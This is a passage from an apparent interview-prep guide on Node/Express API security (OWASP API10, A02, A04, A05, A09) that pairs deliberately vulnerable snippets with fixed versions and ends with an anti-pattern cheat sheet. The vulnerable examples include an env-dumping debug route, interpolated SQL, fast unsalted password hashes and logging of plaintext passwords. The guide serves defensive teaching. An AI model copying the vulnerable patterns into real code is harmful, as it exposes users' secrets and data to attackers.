// VULNERABLE — old unauthenticated debug/v1 routes left mounted "temporarily"
app.get('/debug/env', (_req, res) => res.json(process.env)); // leaks all secrets
app.use('/api/v1', legacyRouterFromTwoYearsAgo);             // unpatched, still live
```

```typescript
// FIXED — gate non-prod routes, sunset old versions, inventory via OpenAPI
if (process.env.NODE_ENV !== 'production') {
  app.get('/debug/env', (_req, res) => res.json({ note: 'dev only' }));
}
// return 410 Gone for retired versions and log any hits for monitoring
app.use('/api/v1', (req, res) => {
  logger.warn('zombie api hit', { path: req.path, ip: req.ip });
  res.status(410).json({ error: 'API v1 is retired, use /api/v2' });
});
```

**Interview trap:** the defenses are process, not just code: maintain an **OpenAPI/Swagger spec as source of truth**, run an API gateway that only routes documented paths, scan the running service for undocumented endpoints, and have a formal **deprecation → sunset** policy with `Deprecation`/`Sunset` headers. "We don't know how many APIs we have" is the actual root cause of many breaches.

---

### Q19. What is Unsafe Consumption of APIs (API10)?

**Answer:**
API10 flips the perspective: you're the *client* of a third-party API, and you trust its responses too much. If you follow its redirects blindly, parse its data without validation, or pass its errors straight through, a compromised or malicious upstream can attack *you* (SSRF, injection, resource exhaustion). Treat third-party responses as untrusted input.

```typescript
// VULNERABLE — trusts a partner API's response completely
const data = await (await fetch(partnerUrl)).json();
await db.query(`UPDATE prices SET amount = ${data.price} WHERE sku = '${data.sku}'`);
// injection + follows redirects + no size/timeout limit
```

```typescript
// FIXED — validate schema, no redirects, timeout + size cap, parameterized write
const controller = new AbortController();
const timer = setTimeout(() => controller.abort(), 5000);
try {
  const resp = await fetch(partnerUrl, { redirect: 'error', signal: controller.signal });
  const parsed = priceSchema.parse(await resp.json()); // zod validates shape/types
  await db.query('UPDATE prices SET amount = $1 WHERE sku = $2', [parsed.price, parsed.sku]);
} finally {
  clearTimeout(timer);
}
```

**Interview trap:** the key mindset shift is that "internal" or "trusted partner" traffic is still untrusted at the byte level. Validate schemas on responses, set timeouts and response-size limits (a hostile upstream can stream forever to exhaust memory), disable auto-redirect following, and never interpolate upstream data into queries or shell commands.

---

### Q20. What are Cryptographic Failures (A02) in a Node context, and how do you handle secrets and hashing correctly?

**Answer:**
A02 (formerly "Sensitive Data Exposure") is protecting data at rest and in transit: use TLS everywhere, hash passwords with a **slow, salted** algorithm (bcrypt/argon2 — never MD5/SHA-1/SHA-256 for passwords), use `crypto.randomBytes`/`randomUUID` for tokens (never `Math.random`), and encrypt sensitive fields with authenticated encryption (AES-256-GCM). Compare secrets with `crypto.timingSafeEqual`.

```typescript
// VULNERABLE — fast unsalted hash, predictable token, timing-leaky compare
const hash = crypto.createHash('sha256').update(password).digest('hex'); // fast = crackable
const token = Math.random().toString(36).slice(2);                        // predictable
if (providedToken === storedToken) grant();                               // timing leak
```

```typescript
// FIXED — argon2 for passwords, CSPRNG tokens, constant-time compare
import argon2 from 'argon2';
import crypto from 'crypto';

const passwordHash = await argon2.hash(password, { type: argon2.argon2id });
const resetToken = crypto.randomBytes(32).toString('hex'); // 256-bit CSPRNG

function safeEqual(a: string, b: string): boolean {
  const ab = Buffer.from(a), bb = Buffer.from(b);
  return ab.length === bb.length && crypto.timingSafeEqual(ab, bb);
}
```

**Interview trap:** SHA-256 is a fine hash for *integrity* but a terrible hash for *passwords* — it's designed to be fast, which helps attackers brute-force. Password hashing must be deliberately slow and memory-hard (argon2id) with a per-user salt (bcrypt/argon2 embed the salt automatically). And `===` on secret comparison leaks length/content via timing — use `timingSafeEqual`.

---

### Q21. What are Security Misconfiguration (A05 / API8) failures you check first on a new codebase?

**Answer:**
A05 is the broadest category and where FDEs find the fastest wins. The checklist: verbose error responses leaking stack traces, CORS set to `*` with credentials, default/committed credentials, debug endpoints exposed, missing security headers, directory listing enabled, and overly permissive cloud IAM. These are config, not code logic — quick to find, quick to fix.

```typescript
// VULNERABLE — reflects stack traces, wide-open CORS with credentials
app.use(cors({ origin: '*', credentials: true })); // invalid+dangerous combo
app.use((err, _req, res, _next) => {
  res.status(500).json({ error: err.message, stack: err.stack }); // leaks internals
});
```

```typescript
// FIXED — explicit CORS allowlist, generic errors in prod, log the detail server-side
const ALLOWED_ORIGINS = new Set(['https://app.example.com']);
app.use(cors({
  origin: (origin, cb) => cb(null, !origin || ALLOWED_ORIGINS.has(origin)),
  credentials: true,
}));
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  logger.error('unhandled error', { message: err.message, stack: err.stack }); // server-only
  res.status(500).json({ error: 'internal server error' }); // opaque to client
});
```

**Interview trap:** `Access-Control-Allow-Origin: *` **cannot** be combined with `Access-Control-Allow-Credentials: true` — browsers reject it, and doing so signals the dev didn't understand CORS. CORS is also *not* an authentication mechanism; it only constrains browser-based cross-origin reads. It does nothing against a direct `curl` or server-to-server call — real authz still lives in your middleware.

---

### Q22. What are Security Logging & Monitoring Failures (A09), and what should you log (and never log)?

**Answer:**
A09 is being unable to detect, alert on, or investigate an attack. You need audit logs for security-relevant events (logins success/failure, authz denials, password/role changes, admin actions), with enough context (who, what, when, source IP, request id) to reconstruct an incident — but you must **never log secrets** (passwords, tokens, full PANs, session cookies).

```typescript
// VULNERABLE — logs the password, no audit trail for denied access
app.post('/login', (req, res) => {
  console.log('login attempt', req.body); // logs plaintext password into your log store
  // ... on 403, nothing is recorded
});
```

```typescript
// FIXED — structured audit events, redacted, correlatable, no secrets
const audit = (event: string, req: Request, extra: object = {}) =>
  logger.info('audit', {
    event, userId: (req as any).user?.id, ip: req.ip,
    requestId: req.headers['x-request-id'], ts: new Date().toISOString(), ...extra,
  });

app.post('/login', async (req, res) => {
  const { email } = loginSchema.parse(req.body); // password never logged
  const ok = await verifyLogin(email, req.body.password);
  audit(ok ? 'login.success' : 'login.failure', req, { email });
  res.status(ok ? 200 : 401).json({ ok });
});
```

**Interview trap:** logging *too much* is its own vulnerability — passwords, JWTs, and PII in logs turn your logging pipeline into a breach target (and a GDPR/PCI violation). Configure redaction (pino's `redact` option) for known-sensitive keys. And logs are useless if nobody watches them: A09 requires **alerting** on patterns (spikes in 401/403, new-country logins), not just writing to a file.

---

### Q23. Why is Insecure Design (A04) different from a bug, and how does threat modeling fit an FDE workflow?

**Answer:**
A04 says some vulnerabilities aren't coding mistakes — they're missing security controls in the *design*. You can implement a feature perfectly and still be insecure because the design never accounted for abuse. Example: a password-reset flow that emails a 4-digit code with no rate limit is guessable by design; no amount of clean code fixes that — the design needs a longer token, expiry, and attempt limits. Threat modeling (STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation) *before* building is the fix.

```typescript
// VULNERABLE by design — short guessable code, no expiry, no attempt limit
const code = Math.floor(1000 + Math.random() * 9000); // 4 digits, 9000 possibilities
await sendEmail(user.email, `Your reset code: ${code}`);
await ResetCode.create({ userId: user.id, code }); // never expires, unlimited guesses
```

```typescript
// FIXED by design — high-entropy token, single-use, expiring, rate-limited verify
const token = crypto.randomBytes(32).toString('base64url');
const tokenHash = crypto.createHash('sha256').update(token).digest('hex'); // store hash only
await ResetToken.create({
  userId: user.id, tokenHash,
  expiresAt: new Date(Date.now() + 15 * 60 * 1000), // 15 min
  used: false,
});
await sendEmail(user.email, `Reset link: https://app.example.com/reset?t=${token}`);
// verify endpoint is rate-limited, checks expiry+used, then marks used atomically
```

**Interview trap:** if asked "how would you have prevented this with a code fix?" for an A04 issue, the honest answer is *you can't fix a design flaw with a patch* — you re-design the flow. As an FDE, you flag these during integration by asking "what's the abuse case?" for each flow (reset, invite, checkout), not just the happy path.

---

### Q24. Put it together: what does a hardened Express bootstrap look like, and what's your review order?

**Answer:**
A defensive baseline every service should start from — and the order I review an unfamiliar codebase in.

```typescript
// FIXED — a hardened Express baseline
import express from 'express';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import mongoSanitize from 'express-mongo-sanitize';

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);                              // correct client IP behind ALB
app.use(helmet());                                      // security headers + CSP
app.use(express.json({ limit: '100kb' }));              // cap body size (DoS)
app.use(mongoSanitize());                               // strip $ / . operator keys
app.use(rateLimit({ windowMs: 60_000, max: 300 }));     // global throttle
// then: authN middleware -> per-route authZ (default deny) -> zod validation -> handler
app.use((err: Error, _req, res, _next) => {             // generic error handler last
  logger.error(err);
  res.status(500).json({ error: 'internal server error' });
});
```

**My review order (highest-hit-rate first):**
1. **Access control (A01/API1/API5):** every route's authZ — grep for `findById` without a tenant/owner scope, `/admin` routes without a role check.
2. **Injection (A03):** string-built SQL, `req.body` into Mongo queries, `exec` with user input.
3. **Mass assignment / data exposure (API3):** `Object.assign(x, req.body)`, `res.json(rawDoc)`.
4. **Auth & secrets (A02/A07):** hashing algorithm, JWT `alg` pinning, secrets in code/URLs/logs.
5. **SSRF (A10/API7):** any `fetch`/`axios` with a user-controlled URL.
6. **Config & headers (A05):** CORS, error verbosity, helmet, `trust proxy`.
7. **Dependencies (A06):** lockfile committed, `npm ci` in CI, `npm audit` clean.

**Production war story:** the fastest breach I ever prevented at a customer took ten minutes: a single `grep` for `Object.assign` in route handlers surfaced their user-update endpoint spreading `req.body` onto the model, and their `role` field was a plain string on that model. Any user could `PATCH` themselves to `role: "admin"`. The fix was one zod `.strict()` schema and an explicit `$set` of two fields. The lesson I always repeat: **the most damaging API bugs are boring one-liners, and you find them by pattern-matching the anti-patterns, not by running a scanner.**

---

## Quick-reference: anti-pattern → fix cheat sheet

| Anti-pattern (grep for this) | Risk | Fix |
|------------------------------|------|-----|
| `findById(req.params.id)` no owner scope | BOLA (API1) | scope query by `req.user.tenantId` |
| `` `SELECT ... ${x}` `` | SQLi (A03) | parameterized query `$1` |
| `req.body.password` into Mongo query | NoSQL injection | coerce to `String`, `bcrypt.compare`, sanitize |
| `exec(`cmd ${x}`)` | Command injection | `execFile(cmd, [args])` |
| `Object.assign(user, req.body)` | Mass assignment (API3) | zod `.strict()` + explicit `$set` |
| `res.json(user)` (raw doc) | Excessive exposure (API3) | allowlist DTO / `.select()` |
| `fetch(req.body.url)` | SSRF (A10/API7) | allowlist + resolve IP + block private ranges |
| recursive `merge` w/o key guard | Prototype pollution | block `__proto__`, `Object.create(null)` |
| `unserialize(userInput)` | Insecure deserialization (A08) | JSON + signature (JWT) |
| `(a+)+` regex on user input | ReDoS | `re2` + input length cap |
| `path.join(base, req.params.x)` | Path traversal | `path.resolve` + prefix check |
| `md5`/`sha256` for passwords | Crypto failure (A02) | argon2id / bcrypt |
| `cors({ origin: '*', credentials: true })` | Misconfig (A05) | explicit origin allowlist |
| `npm install` in CI | Supply chain (A06) | `npm ci --ignore-scripts` + `npm audit` |
| `console.log(req.body)` on login | Logging failure (A09) | structured audit logs, redact secrets |
